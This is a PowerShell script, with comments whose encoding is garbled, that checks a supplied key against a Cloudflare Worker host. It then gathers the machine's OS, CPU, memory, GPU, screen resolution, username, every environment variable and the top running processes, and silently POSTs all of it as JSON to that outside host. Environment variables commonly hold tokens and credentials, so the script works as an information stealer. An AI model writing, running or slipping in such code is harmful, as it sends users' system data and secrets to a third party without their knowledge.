param(
    [Parameter(Mandatory=$true, HelpMessage="����")]
    [string]$key
)

# �� key ���� URL ���루��ֹ�����ַ��������⣩
$encodedKey = [System.Net.WebUtility]::UrlEncode($key)

# Cloudflare Worker �� URL�����滻Ϊ��� Worker ������
$baseUrl = "https://go.panda443212.workers.dev"

# ���� /c �� /u �ӿڵ����� URL
$cUrl = "$baseUrl/c?key=$encodedKey"
$uUrl = "$baseUrl/u?key=$encodedKey"

# ���� /c �ӿڴ��� KV ��
try {
    $cResponse = Invoke-RestMethod -Uri $cUrl -Method GET
    Write-Output "��֤��  $cResponse"
} catch {
    exit 1
}

# ��ȡ����ϵͳ�汾
$osVersion = (Get-WmiObject Win32_OperatingSystem).Caption

# ��ȡ CPU ��Ϣ
$cpu = Get-WmiObject Win32_Processor | Select-Object -First 1
$cpuUsage = (Get-Counter "\Processor(_Total)\% Processor Time").CounterSamples.CookedValue

# ��ȡ�ڴ���Ϣ
$memInfo = Get-WmiObject Win32_PhysicalMemory
$totalMemory = [math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)
$usedMemory = [math]::Round($totalMemory - ((Get-CimInstance Win32_OperatingSystem).FreePhysicalMemory / 1MB), 2)

# ��ȡ�Կ���Ϣ������У�
$gpuInfo = Get-WmiObject Win32_VideoController | Select-Object -First 1
$gpuName = $gpuInfo.Name
$gpuMemory = [math]::Round($gpuInfo.AdapterRAM / 1GB, 2)

# ��ȡ��Ļ�ֱ���
$screenWidth = (Get-WmiObject Win32_VideoController).CurrentHorizontalResolution
$screenHeight = (Get-WmiObject Win32_VideoController).CurrentVerticalResolution
$resolution = "$screenWidth x $screenHeight"

# ��ȡ��ǰ�û���
$username = $env:USERNAME

# ��ȡ��������
$envVariables = Get-ChildItem Env: | ForEach-Object { @{ Name = $_.Name; Value = $_.Value } }

# ��ȡ��ǰ�����б�
$processList = Get-Process | Select-Object Name, Id, CPU, WorkingSet | Sort-Object CPU -Descending | Select-Object -First 10

# ���� JSON ����
$systemData = @{
    osVersion    = $osVersion
    cpu          = @{ name = $cpu.Name; usage = [math]::Round($cpuUsage, 2) }
    memory       = @{ totalGB = $totalMemory; usedGB = $usedMemory; details = $memInfo.Manufacturer }
    gpu          = @{ name = $gpuName; memoryGB = $gpuMemory }
    resolution   = $resolution
    username     = $username
    envVariables = $envVariables
    processes    = $processList
}

# ת��Ϊ JSON
$jsonPayload = $systemData | ConvertTo-Json -Depth 3

# �ϴ����ݵ� Cloudflare Worker
try {
    $uResponse = Invoke-RestMethod -Uri $uUrl -Method POST -Body $jsonPayload -ContentType "application/json"
    Write-Output "�ɹ�: $uResponse"
} catch {
}
